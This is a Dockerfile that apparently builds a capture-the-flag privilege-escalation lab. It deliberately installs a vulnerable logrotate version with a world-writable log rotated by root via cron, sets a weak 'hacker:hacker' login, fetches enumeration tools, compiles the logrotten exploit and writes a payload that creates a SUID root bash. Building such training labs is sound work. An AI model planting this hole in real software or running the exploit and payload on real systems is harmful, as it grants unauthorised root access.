# -----------------------------------------------
# Level: 19
# Difficulty: 
# Categories: 
# Description: This level is still being built.
# Author: malwaredetective
# Last updated: 06/01/2025
# -----------------------------------------------

#FROM ubuntu:18.04
FROM khub/root-crawler:latest
ENV DEBIAN_FRONTEND=noninteractive

# --- Install Required Software Packages ---
RUN apt-get install -y \
    git \
    gcc \
    psmisc \
    netcat \
    logrotate=3.11.0-0.1ubuntu1

# --- Create Users ---
RUN useradd -m -s /bin/bash hacker && echo "hacker:hacker" | chpasswd && \
mkdir /var/run/sshd

# --- Download and Configure Linux Privilege Escalation Tools ---
RUN mkdir /opt/tools && \
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O /opt/tools/linpeas.sh && \
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O /opt/tools/lse.sh && \
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -O /opt/tools/pspy64 && \
chown -R hacker:hacker /opt/tools/ && \
chmod -R 755 /opt/tools/

# --- Configure Privilege Escalation Vulnerability ---
RUN touch /tmp/pwn.log && chmod 666 /tmp/pwn.log && \
echo '/tmp/pwn.log {\n    daily\n    create 644 root root\n    rotate 7\n    notifempty\n    missingok\n}' > /etc/logrotate.d/pwnlog && \
echo '* * * * * root /usr/sbin/logrotate /etc/logrotate.conf' >> /etc/crontab

USER hacker
WORKDIR /home/hacker
RUN git clone https://github.com/whotwagner/logrotten.git && \
cd logrotten && \
gcc logrotten.c -o logrotten && \
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/hacker/payload && \
chmod +x /home/hacker/payload

USER root

# --- Create the Root Flag ---
RUN echo "null" > /root/root.txt && chmod 400 /root/root.txt 

# --- Expose SSH port ---
EXPOSE 22

# --- Set the Default Command when the Container Starts ---
CMD bash -c "service cron start; /usr/sbin/sshd -D"

